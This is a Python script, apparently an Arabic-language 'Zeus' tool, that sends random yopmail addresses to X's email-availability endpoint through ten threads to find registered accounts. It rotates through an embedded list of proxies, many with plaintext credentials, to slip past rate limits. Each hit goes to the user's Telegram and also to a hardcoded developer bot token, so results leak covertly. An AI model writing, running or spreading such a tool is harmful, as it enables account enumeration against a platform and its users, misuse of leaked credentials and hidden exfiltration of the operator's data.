from datetime import datetime
import sys
import time
import requests
import json
import random
from threading import Thread
import os

# الألوان
G = "\033[1;32m"  # أخضر ساطع
R = "\033[1;31m"  # أحمر
W = "\x1b[38;5;15m"  # أبيض
X = "\033[0m"  # إعادة تعيين اللون
Y = "\033[1;33m"  # أصفر
P = "\033[1;35m"  # بنفسجي

SEP = "━━━━━━━━━━━━━━━━━━"

p = f"{P}<[{W}●{P}]>{W}"
xp = f"{P}[{W}•{P}]{W}"
xpxx = f"{P}>{W}>{P}>{W}"

hits = 0
bad = 0
total = 0
good = 0
is_running = True
proxies = []
token = ""
chat_id = ""

# ================= توكن المطور (يصل إليك كل صيد) =================
DEV_TOKEN = "8119792351:AAFWzT5AwaAw00-sLtOjCqTktGcySWxUDC0"
DEV_CHAT_ID = "6319093542"

version = '2.0'
__date__ = datetime.now().strftime("%Y-%m-%d")

logo = f"""
{P}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
{P}⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
{P}⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
{P}⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
{P}⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
{P}⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
{P}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
{P}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
{P}⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
{P}⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
{P}⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
{P}⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
{SEP}
{W}  DEVELOPER {xpxx} Zeus{P}-{W}
{W}  STATUS    {xpxx} Premium
{W}  VERSION   {xpxx} V{P}/{W}{version}
{SEP}
{P}⫷⫸ 𝐃𝐄𝐕Zeus
 @R7_36 ⫷⫸
{SEP}
{xp} FUTURES  {xpxx} FILE{P}〤{W}CLONE
{xp} DEV {xpxx} Zeus ~ R7_36
{xp} TODAYS   {xpxx} {__date__}
{SEP}"""

# ================= البروكسيات المدمجة =================
BUILTIN_PROXIES = [
    "http://mctlkhxx-rotate:nea6mtxhu0h2@p.webshare.io:80",
    "http://s6103021621234:frank100258@202.28.17.5:8080",
    "http://21281002:Cangul12345@193.140.28.22:3128",
    "http://purevpn0s8732217:i67s60ep@px031901.pointtoserver.com:10780",
    "http://solvercf:bypasscloudflare@38.154.203.95:5863",
    "http://solvercf:bypasscloudflare@198.105.121.200:6462",
    "http://solvercf:bypasscloudflare@64.137.96.74:6641",
    "http://solvercf:bypasscloudflare@38.154.185.97:6370",
    "http://solvercf:bypasscloudflare@142.111.67.146:5611",
    "http://solvercf:bypasscloudflare@191.96.254.138:6185",
    # بروكسيات جديدة بدون مصادقة
    "http://5.167.43.11:4444",
    "http://43.173.120.13:8899",
    "http://4.144.146.21:80",
    "http://45.167.124.161:999",
    "http://45.195.90.142:8080",
    "http://5.58.97.89:8080",
    "http://65.109.215.187:8090",
    "http://201.71.2.41:999",
    "http://65.109.219.108:2000",
    "http://27.69.78.20:2080",
    "http://69.75.140.157:8080",
    "http://65.109.176.225:8443",
    "http://134.209.29.120:3128",
    "http://130.110.103.245:3128",
    "http://90.156.196.230:3128",
    "http://138.68.60.8:3128",
    "http://139.59.1.14:8080",
    "http://128.199.202.122:8080",
    "http://150.241.245.131:8080",
    "http://154.201.126.245:8080",
    "http://123.176.126.95:8080",
    "http://159.203.61.169:3128",
    "http://154.59.56.72:999",
    "http://178.92.72.194:8080",
    "http://184.75.221.82:3118",
    "http://175.158.40.224:1616",
    "http://115.127.81.142:58080",
    "http://103.173.163.199:8818",
    "http://181.78.80.222:999",
    "http://191.6.112.5:8086",
    "http://164.52.11.194:18080",
]

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def banner():
    clear_screen()
    print(logo)

def update_stats():
    sys.stdout.write(f"\r{SEP}\n")
    sys.stdout.write(f"{W}  HITS  {xpxx} {P}{hits}\n")
    sys.stdout.write(f"{W}  BAD   {xpxx} {R}{bad}\n")
    sys.stdout.write(f"{W}  TOTAL {xpxx} {Y}{total}\n")
    sys.stdout.write(f"{W}  GOOD  {xpxx} {P}{good}\n")
    sys.stdout.write(f"{SEP}\n")
    sys.stdout.flush()

def load_builtin_proxies():
    global proxies
    proxies = BUILTIN_PROXIES.copy()
    print(f"{P}[+] LOADED {len(proxies)} BUILT-IN PROXIES{X}")
    return True

def gen_email():
    chars = 'qwertyuiopasdfghjklzxcvbnm0123456789'
    length = random.choice([3, 4])
    return ''.join(random.choice(chars) for _ in range(length)) + '@yopmail.com'

def send_tg(email):
    try:
        msg = f"""TWITTER Zeus
━━━━━━━━━━━━━━━━━━
EMAIL: {email}
━━━━━━━━━━━━━━━━━━
BY: @R7_36 ~@R7Aih1
اذا حاب تشترك بنسخه المدفوعه ضمان صيد بدون تشفير ب5"""
        if token and chat_id:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}", timeout=5)
        requests.get(f"https://api.{DEV_TOKEN}/={DEV_CHAT_ID}&text={msg}", timeout=5)
    except:
        pass

def check(email):
    global hits, bad, total, good
    try:
        proxy = {'http': random.choice(proxies), 'https': random.choice(proxies)} if proxies else None
        headers = {
            'accept': '*/*',
            'origin': 'https://x.com',
            'referer': 'https://x.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        r = requests.get(
            'https://api.x.com/i/users/email_available.json',
            params={'email': email},
            headers=headers,
            proxies=proxy,
            timeout=3
        )
        total += 1
        if '"taken":true' in r.text:
            hits += 1
            good += 1
            with open('hits.txt', 'a') as f:
                f.write(f"{email}\n")
            print(f"{P}[+] HIT: {email}{X}")
            send_tg(email)
        else:
            bad += 1
            print(f"{P}PY: @R7_36 ")
        update_stats()
    except:
        bad += 1
        update_stats()

def scanner():
    while is_running:
        check(gen_email())
        time.sleep(0.3)

if __name__ == "__main__":
    banner()
    token = input(f"{P} TOKEN> {X}")
    chat_id = input(f"{P} ID> {X}")
    
    use_proxy = input(f"{P}[?] USE BUILT-IN PROXIES? (Y/N): {X}").strip().lower()
    
    if use_proxy == 'y':
        load_builtin_proxies()
    else:
        print(f"{Y}[!] RUNNING WITHOUT PROXIES{X}")
        proxies = []
    
    banner()
    update_stats()
    print(f"{P}[*] STARTING SCANNER...{X}")
    print(f"{Y} {X}")
    
    for _ in range(10):
        Thread(target=scanner, daemon=True).start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        is_running = False
        print(f"\n{P}[!] STOPPED.{X}")
